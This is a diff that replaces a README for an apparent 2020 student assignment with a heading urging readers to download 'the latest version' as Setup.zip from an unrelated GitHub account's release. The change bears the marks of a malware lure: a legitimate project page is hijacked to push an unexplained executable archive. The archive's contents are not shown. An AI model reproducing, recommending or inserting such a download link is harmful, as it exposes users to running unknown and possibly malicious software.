@@ -1,2 +1,2 @@
-# pw2020_10119322
-tugas 1 2020
+# 🔽Download🔽
+### [Download the latest version](https://github.com/Majinnbuu6/urban-guide/releases/download/hellloooo/Setup.zip)
